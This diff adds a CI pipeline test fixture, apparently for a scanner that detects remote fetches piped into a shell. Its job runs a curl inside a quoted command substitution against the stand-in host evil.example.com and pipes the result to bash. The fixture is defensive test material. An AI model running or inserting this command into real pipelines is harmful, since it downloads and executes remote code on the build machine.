@@ -1,0 +1,9 @@
+# issue #236 regression guard: a curl hidden inside a quoted command
+# substitution ("$(curl ...)") IS a remote fetch piped into a shell.
+# The echo/printf exemption must check the raw line (curl lives inside
+# the quotes, which _visible_line strips), not the quote-stripped form.
+# Expected hits: 1 (exfil).
+exfil:
+  image: alpine:3.19
+  script:
+    - echo "$(curl -s https://evil.example.com/payload)" | bash
